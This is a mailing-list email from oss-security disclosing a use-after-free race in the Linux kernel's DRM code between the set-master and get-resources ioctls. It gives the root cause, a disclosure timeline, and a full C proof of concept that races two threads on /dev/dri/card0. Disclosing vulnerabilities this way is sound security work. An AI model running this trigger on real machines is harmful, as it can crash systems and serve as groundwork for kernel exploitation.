Received: (qmail 19522 invoked by uid 550); 12 Apr 2022 11:48:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1838 invoked from network); 12 Apr 2022 11:42:52 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=mime-version:from:date:message-id:subject:to;
        bh=d12F/PwBVxtStuq4ILlKbllvE+zn7pLAy42wQ2nN80A=;
        b=m+EKuEL8rh9EmeTpUfWFqoOidzlC3LeQNYIFhAPd4E0eCCmpyTPVu+P1FAW3djeg5f
         S8pbeteSM9arqzLRONrqxOmt03dQeJmELQBhFC51zIy0cAtcL3ENHGw/5RQS0NKc2yHL
         /YXj7x/ORVx641qogyAW31fcYRrY4s7po1xfDEBW2nq641+JPPyIU30TTdWpxfI+Z2ch
         p/XcP4gFZ0q02Q6y4nJLFX4ssBHMhiECXF1kEusXeZeoheSRKjmpd14r7Dqv0Mls87T3
         ScJ+z9A5bEe9VlEgRkt+57J498EcflYHgybM5x9IJcgmBHZdb7BHP4mlb/5RgybCJJmO
         oEuQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=d12F/PwBVxtStuq4ILlKbllvE+zn7pLAy42wQ2nN80A=;
        b=q1UHLi9XvqXMJiCk+aao0PTTchLc/JuJlcTHAVnbYu05SbHf60BI2d13ZjhsHu/foZ
         5UhaVkDRl4JqDjpa+5GxVmC9tQpjEPTjTFwWj6gI3QNXYaYOIFZXREDpyPlvZATxTZUz
         v2nJSwINeL7LZiiTCceVj227r1s0MWoO0xmPgdt5Z50TR58zT0IC6HZ95mwrW6Z1ecGg
         9WRZPtq4rGoO3f2HPIVjiYCzod613hwSBe2jKWVmLwR1htjtuheaFVNmD5pR0Ku0JsxL
         NOPUF2ijqkO45hFHULf40jDQW+EBWgPWmZotQQIdJqm9rHtf/lamIVgHLVOLNUP5Q6IL
         k2vQ==
X-Gm-Message-State: AOAM530NK3XvvXFW7xIYy4CRNkzWiVts+fWOJrzexs/H3jnDpFH5RR6Q
	nWwPv/i/k5zPvUjfSAUlNZ7HJY5hZu6WpVl0PhAWzhbUCqU=
X-Google-Smtp-Source: ABdhPJyszvGyhz05h/h/tQH5nudVwK2zE3JjADG9fL8xYlBY0uHAjlXHQf0bVFSC4Np6DjuCEZR/KD+cBQbE3y4m8ek=
X-Received: by 2002:a25:c6c6:0:b0:641:a1e:1c7 with SMTP id k189-20020a25c6c6000000b006410a1e01c7mr13114583ybf.108.1649763760784;
 Tue, 12 Apr 2022 04:42:40 -0700 (PDT)
MIME-Version: 1.0
From: Minh Yuan <yuanmingbuaa@gmail.com>
Date: Tue, 12 Apr 2022 19:42:04 +0800
Message-ID: <CAH5WSp6-nveUGNR8cEdXbFQs0m3AsDmhoN9sDx+WXfn2JsdjHg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000ecc7ee05dc738ebc"
Subject: [oss-security] Linux kernel: A concurrency use-after-free between drm_setmaster_ioctl and drm_mode_getresources

--000000000000ecc7ee05dc738ebc
Content-Type: text/plain; charset="UTF-8"

Hi guys,

We recently discovered a concurrency uaf in drm of the latest kernel
version (Linux 4.19.237).

The root cause of this race is that drm_setmaster_ioctl can free an old
*fpriv->master* in drm_new_set_master, while drm_mode_getresources holds a
freed *fpriv->master *in drm_lease_held due to the absence of proper
lock/refcounting.

My unstable PoC is shown below (tested on Linux 4.19.237):

#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/xattr.h>
#include <sys/shm.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <drm/drm.h>
#include <drm/drm_mode.h>

#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
} while (0)
int fd;
char a[0x100];
void *thread1(void *arg)
{

ioctl(fd, DRM_IOCTL_SET_MASTER, 0);

}
void *thread2(void *arg)
{
ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &a);
}
int main(void)
{
pthread_t thr1,thr2;

int fd1 = open("/dev/dri/card0",0);
fd = open("/dev/dri/card0",0);
int fd2 = dup3(fd,fd1,0);
int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
if(s != 0)
errExit("pthread_create");
s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
if(s != 0)
errExit("pthread_create");
pthread_join(thr1,NULL);
pthread_join(thr2,NULL);
close(fd);
}

Timeline:
* 03.30.22 - Vulnerability reported to security@kernel.org.
* 04.01.22 - Vulnerability reported to linux-distros@vs.openwall.org
<security@kernel.org>.
* 04.12.22 - Vulnerability opened.

--000000000000ecc7ee05dc738ebc--
